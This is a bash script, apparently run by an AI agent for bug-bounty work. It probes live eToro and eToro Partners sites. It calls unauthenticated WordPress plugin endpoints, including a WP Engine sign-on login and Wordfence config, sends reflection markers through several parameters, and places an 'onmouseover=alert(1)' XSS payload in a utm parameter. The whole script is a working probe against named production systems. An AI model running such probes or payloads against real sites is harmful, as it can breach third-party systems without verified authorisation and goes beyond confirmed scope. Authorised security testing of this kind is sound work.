#!/usr/bin/env bash
set -euo pipefail
HDR=(-H "X-Bug-Bounty: cursor-cloud-agent" -H "User-Agent: Mozilla/5.0 (compatible; BugBounty/1.0)")
OUTDIR="/workspace/research/etoro/composer-xss/raw"
LOG="$OUTDIR/log2.txt"
COUNT_FILE="$OUTDIR/req_count.txt"
: > "$LOG"
BASE=$(cat "$COUNT_FILE")

req() {
  local id="$1" url="$2"
  local extra=("${@:3}")
  BASE=$((BASE + 1))
  echo "$BASE" > "$COUNT_FILE"
  echo "=== REQ#$BASE $id ===" >> "$LOG"
  echo "URL: $url" >> "$LOG"
  local body hdr
  body=$(mktemp); hdr=$(mktemp)
  local code
  code=$(curl -sS -L -D "$hdr" -o "$body" -w "%{http_code}" --max-time 25 "${HDR[@]}" "${extra[@]}" "$url" 2>>"$LOG" || echo "000")
  {
    echo "http_code=$code size=$(wc -c < "$body")"
    grep -iE '^(HTTP/|content-type:|location:)' "$hdr" 2>/dev/null | head -15 || true
    echo "BODY_SNIP:"
    head -c 1500 "$body"
    echo
  } >> "$LOG"
  cp "$body" "$OUTDIR/${BASE}_${id}.body" 2>/dev/null || true
  rm -f "$body" "$hdr"
  echo "REQ#$BASE $id code=$code"
}

# WP plugin endpoints (unauth probe)
req partners_redir_list "https://etoropartners.com/wp-json/redirection/v1/redirect"
req partners_redir_plugin "https://etoropartners.com/wp-json/redirection/v1/plugin"
req partners_wpe_login "https://etoropartners.com/wp-json/wpe_sign_on_plugin/v1/login" -X POST -H "Content-Type: application/json" -d '{}'
req partners_wpe_logged "https://etoropartners.com/wp-json/wpe_sign_on_plugin/v1/is_user_logged_in"
req partners_wf "https://etoropartners.com/wp-json/wordfence/v1/"
req partners_posts "https://etoropartners.com/wp-json/wp/v2/posts?per_page=1&_embed"
req partners_pages "https://etoropartners.com/wp-json/wp/v2/pages?per_page=1"

# eToro public reflection - TJoin, portfolio, utm
MARKER='bbxss9cursor'
req etoro_tjoin "https://www.etoro.com/TJoin/?ref=${MARKER}"
req etoro_portfolio "https://www.etoro.com/people/${MARKER}"
req etoro_utm "https://www.etoro.com/?utm_source=${MARKER}%22onmouseover%3Dalert(1)%22"

# SSO forgot-password email param (1 reflection test)
req etoro_forgot_email "https://www.etoro.com/login/forgot-password?email=${MARKER}%40test.com"

# partners search
req partners_search "https://etoropartners.com/?s=${MARKER}"

# wordfence config if exposed
req partners_wf_config "https://etoropartners.com/wp-json/wordfence/v1/config"

echo "TOTAL=$(cat "$COUNT_FILE")" >> "$LOG"
echo "DONE total=$(cat "$COUNT_FILE")"
